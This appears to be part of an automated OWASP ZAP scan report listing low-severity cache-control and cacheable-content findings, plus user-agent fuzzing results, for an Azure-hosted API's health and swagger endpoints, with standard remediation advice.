#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3

### [ Re-examine Cache-control Directives ](https://www.zaproxy.org/docs/alerts/10015/)



##### Informational (Low)

### Description

The cache-control header has not been set properly or is missing, allowing the browser and proxies to cache content. For static assets like css, js, or image files this might be intended, however, the resources should be reviewed to ensure that no sensitive content will be cached.

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/health
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `cache-control`
  * Attack: ``
  * Evidence: ``
  * Other Info: ``

Instances: 2

### Solution

For secure content, ensure the cache-control HTTP header is set with "no-cache, no-store, must-revalidate". If an asset should be cached consider setting the directives "public, max-age, immutable".

### Reference


* [ https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching ](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#web-content-caching)
* [ https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control ](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cache-Control)
* [ https://grayduck.mn/2021/09/13/cache-control-recommendations/ ](https://grayduck.mn/2021/09/13/cache-control-recommendations/)


#### CWE Id: [ 525 ](https://cwe.mitre.org/data/definitions/525.html)


#### WASC Id: 13

#### Source ID: 3

### [ Storable and Cacheable Content ](https://www.zaproxy.org/docs/alerts/10049/)



##### Informational (Medium)

### Description

The response contents are storable by caching components such as proxy servers, and may be retrieved directly from the cache, rather than from the origin server by the caching servers, in response to similar requests from other users. If the response data is sensitive, personal or user-specific, this may result in sensitive information being leaked. In some cases, this may even result in a user gaining complete control of the session of another user, depending on the configuration of the caching components in use in their environment. This is primarily an issue where "shared" caching servers such as "proxy" caches are configured on the local network. This configuration is typically found in corporate or educational environments, for instance.

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/health
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: ``
  * Other Info: `In the absence of an explicitly specified caching lifetime directive in the response, a liberal lifetime heuristic of 1 year was assumed. This is permitted by rfc7234.`

Instances: 1

### Solution

Validate that the response does not contain sensitive, personal or user-specific information. If it does, consider the use of the following HTTP response headers, to limit, or prevent the content being stored and retrieved from the cache by another user:
Cache-Control: no-cache, no-store, must-revalidate, private
Pragma: no-cache
Expires: 0
This configuration directs both HTTP 1.0 and HTTP 1.1 compliant caching servers to not store the response, and to not retrieve the response (without validation) from the cache, in response to a similar request.

### Reference


* [ https://datatracker.ietf.org/doc/html/rfc7234 ](https://datatracker.ietf.org/doc/html/rfc7234)
* [ https://datatracker.ietf.org/doc/html/rfc7231 ](https://datatracker.ietf.org/doc/html/rfc7231)
* [ https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html ](https://www.w3.org/Protocols/rfc2616/rfc2616-sec13.html)


#### CWE Id: [ 524 ](https://cwe.mitre.org/data/definitions/524.html)


#### WASC Id: 13

#### Source ID: 3

### [ User Agent Fuzzer ](https://www.zaproxy.org/docs/alerts/10104/)



##### Informational (Medium)

### Description

Check for differences in response based on fuzzed User Agent (eg. mobile sites, access as a Search Engine Crawler). Compares the response statuscode and the hashcode of the response body with the original response.

* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3739.0 Safari/537.36 Edg/75.0.109.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/91.0`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; CPU iPhone OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A366 Safari/600.1.4`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16`
  * Evidence: ``
  * Other Info: ``
* URL: https://s198d01-ebis-benchmark-fa.azurewebsites.net/api/swagger.json
  * Method: `GET`
  * Parameter: `Header User-Agent`
  * Attack: `msnbot/1.1 (+http://search.msn.com/msnbot.htm)`
  * Evidence: ``
  * Other Info: ``

Instances: 12

### Solution



### Reference


* [ https://owasp.org/wstg ](https://owasp.org/wstg)



#### Source ID: 1


\newpage
